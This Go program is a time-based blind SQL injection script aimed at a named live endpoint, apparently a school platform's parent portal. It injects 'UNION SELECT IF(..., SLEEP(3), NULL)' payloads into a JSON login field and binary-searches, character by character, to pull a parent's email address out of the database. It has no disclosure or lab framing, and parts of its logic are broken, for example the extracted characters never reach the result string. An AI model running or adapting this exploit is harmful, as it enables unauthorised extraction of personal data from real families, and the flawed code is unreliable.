package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"sync"
	"time"
)

// TestSQLCondition sends a POST request with a crafted JSON body to test a SQL condition via time-based blind injection.
// It returns the elapsed time and the response body.
func TestSQLCondition(sqlCondition string) (elapsed time.Duration, response string, err error) {
	url := "https://parents.classlink.com/proxies/api/portal/student/logintype"
	body := map[string]interface{}{
		"user_name": "test@test.com",
		"tenantid":  fmt.Sprintf(`3702 UNION SELECT IF(%s, SLEEP(3), NULL) -- -`, sqlCondition),
	}
	jsonBody, err := json.Marshal(body)
	if err != nil {
		return 0, "", err
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonBody))
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("Content-Type", "application/json")

	start := time.Now()
	resp, err := http.DefaultClient.Do(req)
	elapsed = time.Since(start)
	if err != nil {
		return elapsed, "", err
	}
	defer resp.Body.Close()

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return elapsed, "", err
	}

	return elapsed, string(respBody), nil
}

func boolQuery(sqlCondition string) bool {
	elapsed, _, err := TestSQLCondition(sqlCondition)
	if err != nil {
		fmt.Println("Error:", err)
		return false
	}
	if elapsed > 3*time.Second {
		return true
	}
	return false
}

func binarySearch(query string, index int, low int, high int) int {
	for low <= high {
		mid := (low + high) / 2

		if boolQuery(fmt.Sprintf("ASCII(SUBSTRING(%s, %d, 1)) > %d", query, index, mid)) {
			low = mid + 1
			continue
		}

		if boolQuery(fmt.Sprintf("ASCII(SUBSTRING(%s, %d, 1)) < %d", query, index, mid)) {
			high = mid - 1
			continue
		}

		return mid
	}
	return -1
}

// loggingWorker initializes and starts the logging worker goroutine.
// It takes the foundChan, done channel, and the length of the result string.
func loggingWorker(foundChan <-chan foundChar, done chan<- struct{}, length int) {
	go func() {
		known := make([]rune, length)
		for i := range known {
			known[i] = '?'
		}
		remaining := length
		for fc := range foundChan {
			known[fc.Index] = fc.Char
			fmt.Printf("Current string: %s\n", string(known))
			remaining--
			if remaining == 0 {
				close(done)
			}
		}
	}()
}

type foundChar struct {
	Index int
	Char  rune
}

func main() {
	startTime := time.Now() // Start timing the whole program

	query := "select email from parent_992 limit 1"

	// Find the length of the result string so we can know how many characters to extract
	lengthCharCode := binarySearch(fmt.Sprintf("LENGTH(%s)", query), 1, 48, 57)
	lengthStr := string(rune(lengthCharCode))
	length, err := strconv.Atoi(lengthStr)
	if err != nil {
		fmt.Println("Error converting length to int:", err)
		return
	}
	fmt.Println("Query result string length: ", length)

	// Initialize the result string with '?' for each index of the result string
	result := make([]rune, length)
	for i := range result {
		result[i] = '?'
	}

	// Creates a channel for threads to send the found characters to the logging worker
	foundChan := make(chan foundChar, length)

	// Creates a channel for the logging worker to signal when it's done
	done := make(chan struct{})

	// Start the logging worker using the new function
	loggingWorker(foundChan, done, length)

	// Spawn a worker (thread) for each character to extract
	wg := sync.WaitGroup{}
	wg.Add(length)

	for i := 0; i < length; i++ {
		go func(i int) {
			defer wg.Done()
			char := rune(binarySearch(fmt.Sprintf("SUBSTRING(%s, %d, 1)", query, i+1), 1, 32, 126))
			fmt.Printf("Character %d: %c\n", i+1, char)

			// Send the character to the logging worker when found
			foundChan <- foundChar{Index: i, Char: char}
		}(i)

	}

	// Wait for all workers to finish
	wg.Wait()

	// Close the channel to signal the worker to finish
	close(foundChan)

	// Wait for the logging worker to finish
	<-done

	// Print the final result
	resultStr := string(result)
	if boolQuery(fmt.Sprintf("%s = %d", query, resultStr)) {
		fmt.Printf("Extracted string: %s\n", string(result))
	} else {
		fmt.Println("Final String did not match the query")
	}

	// Print the elapsed time of the whole program
	elapsed := time.Since(startTime)
	fmt.Printf("Total elapsed time: %s\n", elapsed)
}
